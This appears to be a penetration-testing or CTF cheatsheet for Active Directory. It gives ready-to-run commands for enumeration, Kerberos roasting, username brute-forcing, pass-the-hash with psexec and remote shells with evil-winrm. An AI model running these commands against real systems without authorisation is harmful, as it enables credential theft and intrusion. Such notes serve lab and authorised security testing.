---
title: Active Directory
---

# Active Directory
- [gcholette docs AD Privesc](https://docs.gcholette.com/docs/ctf/privesc/privesc_ad)
- [Hacktricks AD](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [Hackthebox AD cheatsheet](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide)

## Enum
### enum4linux
 - [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)
```bash
enum4linux -a -u "" -p "" $targetdomain && enum4linux -a -u "guest" -p "" $targetdomain
```

### crackmapexec
- [crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec)
```bash
crackmapexec smb $targetdomain -u 'anonymous' -p '' --rid-brute
```

### kerbrute
- [kerbrute](https://github.com/ropnop/kerbrute)
- [xato-net-10-million-usernames.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)
```bash
./kerbrute_linux_amd64 userenum -d $targetdomain --dc $targetdc /usr/share/wordlists/xato-net-10-million-usernames.txt 
```

### rpcclient
- [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
```bash
rpcclient -U guest $targetdomain
```

### smbclient
- [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
```bash
smbclient \\\\$targetdomain\\C$ -U guest
```

### impacket
- [impacket](https://github.com/fortra/impacket)
```bash
python GetNPUsers.py $targetdomain/ -usersfile users.txt -dc-ip $targetdomain
```
```bash
python GetUserSPNs.py -request -dc-ip $targetdomain $targetdomain/guest -no-pass
```
```bash
python mssqlclient.py -p 1433 -windows-auth -dc-ip $targetdomain "$targetdomain/$targetusername:$targetpassword"@$targetdomain
```
```bash
python psexec.py -hashes hhhhhhhhh:hhhhhhhhh $targetadmin@$targetdomain
```

## Exploit
- [WADComs](https://wadcoms.github.io/)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [certipy](https://github.com/ly4k/Certipy)
- [Certify](https://github.com/GhostPack/Certify)

### evil winrm
- [evil-winrm](https://github.com/Hackplayers/evil-winrm)
  - `gem install evil-winrm`

```bash
evil-winrm  -i $targetdomain -u $targetuser@$targetdomain -p $targetpassword
```
